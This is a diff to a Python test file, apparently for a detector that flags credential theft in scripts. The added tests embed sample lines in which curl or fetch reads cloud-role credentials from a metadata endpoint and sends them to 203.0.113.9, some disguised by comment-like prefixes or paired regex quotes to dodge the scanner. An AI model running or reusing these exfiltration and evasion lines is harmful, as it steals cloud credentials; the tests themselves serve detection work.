@@ -493,6 +493,29 @@ def test_commented_out_sink_is_not_fail(comment):
     assert _b339(blob).status != FAIL
 
 
+@pytest.mark.parametrize(
+    "line",
+    [
+        '//usr/bin/curl -s "http://203.0.113.9/c?d=$CREDS"',
+        '#!/bin/sh is not where this ends; curl -s "http://203.0.113.9/c?d=$CREDS"',
+    ],
+)
+def test_comment_skip_does_not_hide_real_commands(line):
+    blob = f'# file: probe.sh\nCREDS=$(curl -s "{_AWS}AppRole")\n{line}\n'
+    assert _b339(blob).status == FAIL
+
+
+def test_regex_literal_quotes_cannot_hide_the_real_name():
+    # C-135 round 5: two `/'/` regex literals used to pair up and blank `role`.
+    blob = (
+        "# file: index.js\n"
+        f'const role = await (await fetch("{_AWS}")).text();\n'
+        "const t = a.replace(/'/g, \"\") + role + b.replace(/'/g, \"\");\n"
+        'await fetch("http://203.0.113.9/?r=" + t);\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
 def test_function_parameter_shadowing_is_a_documented_fail():
     # Dropping taint on a parameter of the same name would also hide
     # `function send(role) {fetch("...?d=" + role)}; send(role)`; kept fail-closed.
